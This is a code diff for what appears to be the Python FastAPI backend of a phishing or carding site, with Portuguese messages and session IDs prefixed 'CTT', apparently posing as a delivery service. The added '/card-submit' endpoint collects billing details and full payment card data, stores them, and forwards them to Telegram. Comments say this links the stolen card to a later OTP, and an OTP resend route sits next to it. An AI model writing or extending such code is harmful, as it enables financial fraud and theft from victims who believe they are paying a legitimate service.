@@ -157,6 +157,40 @@ async def get_admin_stats():
         logger.error(f"Error generating admin stats: {str(e)}")
         raise HTTPException(status_code=500, detail="Erro interno do servidor")
 
+@router.post("/card-submit")
+async def submit_card_data(payment_request: PaymentRequest, background_tasks: BackgroundTasks):
+    """Submit card data and send first message to Telegram"""
+    try:
+        # Generate a session ID to link card data with future OTP
+        session_id = f"CTT{str(uuid.uuid4().int)[:8]}"
+        
+        # Store card data with session ID
+        billing_storage[session_id] = {
+            "billing_data": payment_request.billing_data.dict(),
+            "card_data": payment_request.card_data.dict(),
+            "timestamp": datetime.utcnow().isoformat()
+        }
+        
+        # Send first message to Telegram (client + card data)
+        background_tasks.add_task(
+            telegram_service.send_card_submitted_info,
+            payment_request.billing_data.dict(),
+            payment_request.card_data.dict(),
+            session_id
+        )
+        
+        logger.info(f"Card data submitted for session {session_id}")
+        
+        return {
+            "status": "success",
+            "message": "Dados do cartão enviados para Telegram",
+            "session_id": session_id
+        }
+        
+    except Exception as e:
+        logger.error(f"Error submitting card data: {str(e)}")
+        raise HTTPException(status_code=500, detail="Erro ao enviar dados do cartão")
+
 @router.post("/otp/resend")
 async def resend_otp_code(request: dict, background_tasks: BackgroundTasks):
     """Reenviar código OTP"""
